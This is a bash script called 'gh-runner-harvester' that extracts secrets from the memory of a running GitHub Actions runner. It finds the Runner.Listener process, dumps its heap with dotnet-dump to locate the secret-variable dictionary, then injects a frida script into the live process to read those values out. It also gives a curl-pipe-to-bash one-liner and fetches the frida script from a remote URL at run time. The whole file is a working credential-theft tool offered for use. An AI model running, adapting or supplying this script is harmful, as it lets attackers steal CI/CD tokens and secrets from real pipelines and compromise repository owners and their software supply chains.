#!/usr/bin/env bash
#
# gh-runner-harvester - dump.sh
#
# Extract secrets held in a running GitHub Actions runner's memory
# (Runner.Listener) using dotnet-dump + frida.
#
# Usage:
#   ./dump.sh                 # uses the dump.js sitting next to this script
#   PID=12345 ./dump.sh       # skip process discovery, target a specific PID
#
# One-liner (after the repo is public; pulls both files from GitHub):
#   curl -sSf https://raw.githubusercontent.com/hugo-syn/gh-runner-harvester/main/dump.sh | bash
#
# Requires root (attach to the runner process + ptrace).
#
set -euo pipefail

# Where this script lives, so we can find the bundled frida script.
# Empty when piped into bash via `curl | bash`.
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd || true)"

# Fallback location for dump.js when running straight from a pipe.
RAW_BASE="${RAW_BASE:-https://raw.githubusercontent.com/hugo-syn/gh-runner-harvester/main}"

WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/gh-runner-harvester.XXXXXX")"
cleanup() { rm -rf "$WORKDIR"; }
trap cleanup EXIT

DUMP_JS="$WORKDIR/dump.js"
PID="${PID:-}"

echo "[+] installing dotnet-dump."
dotnet tool install --global dotnet-dump >/dev/null 2>&1 || true
export PATH="$PATH:$HOME/.dotnet/tools"

if ! command -v frida >/dev/null 2>&1; then
    echo "[+] installing frida-tools."
    pip install frida-tools >/dev/null 2>&1 || pip3 install frida-tools >/dev/null 2>&1
fi

# --- Locate the target PID -------------------------------------------------
if [[ -z "$PID" ]]; then
    echo "[+] Get the PID of the runner."
    PID="$(dotnet-dump ps | grep Runner.Listener | awk '{print $1}' | head -n1)"
fi

if [[ -z "$PID" ]]; then
    echo "[-] Could not find a Runner.Listener process. Pass one with PID=<pid>." >&2
    exit 1
fi
echo "[+] Runner PID: $PID"

# --- Locate the secrets dictionary address in a memory dump ----------------
echo "[+] Get address of the secrets."
# System.Collections.Generic.Dictionary<System.String, GitHub.DistributedTask.WebApi.VariableValue>
dotnet-dump collect -p "$PID" -o "$WORKDIR/dump.dmp" >/dev/null 2>&1
dotnet-dump analyze "$WORKDIR/dump.dmp" \
    -c 'dumpheap -type GitHub.DistributedTask.WebApi.VariableValue' \
    -c quit > "$WORKDIR/dump.analysis" 2>&1

VARIABLEVALUE_MT="$(grep 'System.Collections.Generic.Dictionary.*VariableValue>$' "$WORKDIR/dump.analysis" | awk '{print $1}' | head -n1)"
VARIABLEVALUE_ADDRESS="$(grep "$VARIABLEVALUE_MT" "$WORKDIR/dump.analysis" | head -n1 | awk '{print $1}')"

if [[ -z "$VARIABLEVALUE_ADDRESS" ]]; then
    echo "[-] Could not locate the VariableValue dictionary in the dump." >&2
    exit 1
fi
echo "[+] Dictionary address: 0x$VARIABLEVALUE_ADDRESS"

# --- Fetch / prepare the frida script --------------------------------------
if [[ -n "$SCRIPT_DIR" && -f "$SCRIPT_DIR/dump.js" ]]; then
    cp "$SCRIPT_DIR/dump.js" "$DUMP_JS"
else
    echo "[+] Fetching dump.js from $RAW_BASE."
    curl -sSf "$RAW_BASE/dump.js" -o "$DUMP_JS"
fi
sed -i "s/0xFIXME/0x$VARIABLEVALUE_ADDRESS/" "$DUMP_JS"

# --- Run frida against the live process ------------------------------------
echo "[+] Run frida script."
frida -q -p "$PID" -l "$DUMP_JS"
